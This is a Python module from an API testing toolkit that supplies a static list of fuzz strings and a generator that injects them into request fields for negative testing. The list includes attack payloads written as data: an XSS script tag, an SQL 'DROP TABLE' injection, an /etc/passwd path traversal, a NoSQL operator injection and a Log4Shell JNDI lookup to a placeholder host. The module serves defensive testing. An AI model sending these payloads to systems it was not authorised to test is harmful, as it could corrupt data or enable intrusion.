"""
Lightweight fuzz inputs for boundary and injection testing.

These are static lists meant to seed parameter or body fields. For coverage
beyond this, integrate ``hypothesis`` separately.
"""
from __future__ import annotations

from typing import Iterator, List, Sequence

from je_api_testka.utils.logging.loggin_instance import apitestka_logger

DEFAULT_MAX_FUZZ: int = 100

_FUZZ_STRINGS: List[str] = [
    "",
    " ",
    "null",
    "undefined",
    "NaN",
    "<script>alert(1)</script>",
    "'; DROP TABLE users;--",
    "../../../../etc/passwd",
    "%00",
    "\x00",
    "‮",
    "🤖" * 50,
    "A" * 1024,
    "{\"$gt\": \"\"}",
    "${jndi:ldap://example.invalid/x}",
]


def fuzz_string_inputs(limit: int = DEFAULT_MAX_FUZZ) -> List[str]:
    """Return a copy of the static fuzz string list, capped at ``limit``."""
    apitestka_logger.info(f"fuzz fuzz_string_inputs limit: {limit}")
    return list(_FUZZ_STRINGS[: max(limit, 0)])


def fuzz_value_pool(template: dict, fields: Sequence[str]) -> Iterator[dict]:
    """
    Yield mutated copies of ``template`` where each named field is replaced
    once with each fuzz string. Use to drive negative-test loops.
    """
    apitestka_logger.info(f"fuzz fuzz_value_pool fields: {fields}")
    for field in fields:
        for value in _FUZZ_STRINGS:
            mutated = dict(template)
            mutated[field] = value
            yield mutated
